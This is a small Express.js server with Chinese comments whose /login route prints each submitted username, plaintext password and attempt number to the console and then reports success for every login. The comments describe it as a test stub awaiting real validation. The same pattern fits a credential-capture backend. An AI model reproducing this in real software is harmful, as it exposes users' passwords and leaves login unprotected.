const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

// 讓 js, css, image 資料夾可以被前端存取
app.use('/js', express.static(path.join(__dirname, 'js')));
app.use('/css', express.static(path.join(__dirname, 'css')));
app.use('/image', express.static(path.join(__dirname, 'image')));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// 顯示 HTML 頁面
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 處理登入表單
app.post('/login', (req, res) => {
    const { username, password, attempt } = req.body;

    console.log(`收到登入嘗試第${attempt}次：`);
    console.log("帳號（username）:", username);
    console.log("密碼（password）:", password);

    // 這邊可接真實帳密驗證邏輯（目前只測試顯示）
    
    // 假設登入成功，這裡可以加入你的驗證邏輯
    const isLoginSuccessful = true;  // 假設登入成功
    if (isLoginSuccessful) {
        res.json({ success: true, message: "登入成功!" });
    } else {
        res.json({ success: false, message: "登入失敗!" });
    }
});

// 啟動伺服器
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
